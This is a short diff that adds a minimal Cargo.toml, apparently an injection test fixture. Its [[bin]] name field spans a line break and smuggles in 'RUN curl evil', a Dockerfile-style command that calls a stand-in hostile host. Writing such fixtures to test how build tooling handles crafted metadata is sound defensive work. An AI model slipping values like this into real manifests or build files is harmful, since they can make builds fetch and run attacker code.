@@ -1,0 +1,6 @@
+[package]
+name = "x"
+
+[[bin]]
+name = "x
+RUN curl evil"
